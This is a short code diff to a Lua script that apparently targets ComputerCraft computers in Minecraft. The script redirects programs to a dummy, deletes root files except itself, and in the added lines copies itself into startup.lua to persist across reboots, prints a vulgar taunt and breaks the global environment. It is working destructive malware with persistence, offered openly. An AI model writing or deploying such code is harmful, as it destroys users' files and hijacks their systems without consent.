@@ -5,6 +5,14 @@ for k,v in pairs(fllst) do
     shell.setAlias(flnm, "/roms/programs/no.lua")
 end
 for k,v in pairs(mnfllst) do
-    fs.delete("/"..v)
+    if v ~= "cfuck.lua" then
+        fs.delete("/"..v)
+    end
 end
-_G = nil
+local strup = fs.open("/startup.lua","w")
+local cfu = fs.open(shell.getRunningProgram(),"r")
+strup.write(cfu.readAll())
+strup.close()
+cfu.close()
+print("Fuck you :P")
+_G._G = nil
